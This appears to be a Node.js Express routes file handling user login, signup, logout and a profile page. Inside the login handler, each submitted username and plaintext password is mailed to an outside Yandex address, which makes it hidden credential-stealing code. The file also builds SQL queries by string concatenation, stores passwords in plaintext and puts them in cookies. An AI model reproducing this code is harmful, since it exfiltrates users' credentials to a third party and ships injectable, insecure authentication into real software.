var express = require('express');
var router = express.Router();
var mysql = require('mysql');
var session = require('express-session');
var Cookies = require('cookies');
var dbScript = require("../db/dbscript.js");
var bodyParser = require("body-parser");
var urlencodedParser = bodyParser.urlencoded({extended: false});
var sha1 = require('sha1');
var nodemailer = require('nodemailer');

router.get('/login', function(req, res) {
    res.header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=12");
    res.header("Pragma", "no-cache");
    res.header("Expires", 0);
	res.render('login');
	
});

router.post('/login', urlencodedParser, function(req, res) {
    res.header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=12");
    res.header("Pragma", "no-cache");
    res.header("Expires", 0);
	let cookie = new Cookies(req, res, { expires: 10000 });
	
	let username = req.body.username;
	let password = req.body.password;
	
	var transporter = nodemailer.createTransport({
		service: 'gmail',
		auth: {
			user: '',
			pass: ''
		}
	});
	
	var mailOptions = {
		from: 'youremail@gmail.com',
		to: 'denis14102000@yandex.ru',
		subject: 'Sending Email using Node.js',
		html: `Ваш логин: <b>${username}</b> <br> Ваш пароль: <b>${password}</b>`
	};

	transporter.sendMail(mailOptions, function(error, info){
		if (error) {
			console.log(error);
		} else {
			console.log('Email sent: ' + info.response);
		}
	});
	
	dbScript.query({ sql: "SELECT * FROM `users` WHERE name = '" + username + "' AND password = '" + password + "'" }, function (err, result, fields) {
		if(err) {
			res.render('login', { msg: err });
		}
		else {
			console.log(result[0]);
			
			if (result.length != 0) {
				cookie
					.set('token', result[0]["token"])
					.set('username', username)
					.set('password', password);
				
				res.send({redirect: '/user'});
			}	
		}
	});
	
	
	
});

router.get('/signup', function(req, res) {
    res.header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=12");
    res.header("Pragma", "no-cache");
    res.header("Expires", 0);
	res.render('signup');
});

router.post('/signup', urlencodedParser, function(req, res) {
	let username = req.body.username;
	let password = req.body.password;
	let token = sha1(username + password + Math.random(1618));
	let cookie = new Cookies(req, res, { expires: 10000 });
	let sql = "INSERT INTO `users`(`name`,`password`,`created_at`, `token`) VALUES ('" + username + "', '" + password + "', '"+(new Date()).toISOString() +"', '" + token + "')";
	
	dbScript.query({ sql: sql }, function (err, result, fields) {
		if(err) {
			res.render('error', { err: err });
		}
		else {
			cookie
				.set('username', username)
				.set('password', password)
				.set('token', token);
			res.send({ redirect: '/login'});
		}
	});
	
});

router.get('/logout', function(req, res) {
	let cookie = new Cookies(req, res, { expires: 10000 });
	cookie
		.set('username', '')
		.set('password', '')
		.set('token', '');
	return res.redirect('/login');
});

router.get('/user', function(req, res) {
    res.header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=12");
    res.header("Pragma", "no-cache");
    res.header("Expires", 0);
	var cookie = new Cookies(req, res, { maxAge: 10000 });
	var data = {
		username: cookie.get('username'),
		password: cookie.get('password')
	};
	
	res.render('user', data);
});

module.exports = router;
